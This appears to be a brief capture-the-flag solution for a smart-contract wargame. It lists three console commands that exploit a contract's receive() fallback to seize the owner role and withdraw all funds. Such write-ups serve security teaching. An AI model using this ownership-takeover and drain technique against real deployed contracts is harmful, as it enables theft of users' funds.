Solution: Use fallback function to gain owner role.

1. Contribute to contract, this allow us to pass `contributions[msg.sender] > 0` check in receive()
```
await contract.contribute({value: 1000000000})
```
2. Use receive()
```
await contract.sendTransaction({value: 1})
```
3. Withdraw all funds from contract
```
await contract.withdraw()
```
